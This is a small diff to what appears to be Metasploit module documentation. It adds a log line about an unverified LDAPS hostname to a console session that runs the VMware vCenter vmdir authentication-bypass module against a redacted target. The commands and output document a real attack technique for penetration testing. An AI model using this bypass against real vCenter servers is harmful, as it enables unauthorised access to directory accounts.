@@ -71,6 +71,7 @@ msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set password msfad
 password => msfadmin
 msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > run
 [*] Running module against [redacted]
+not verifying SSL hostname of LDAPS server '[redacted]:636'
 
 [*] Using auxiliary/gather/vmware_vcenter_vmdir_ldap as check
 [*] Discovering base DN automatically
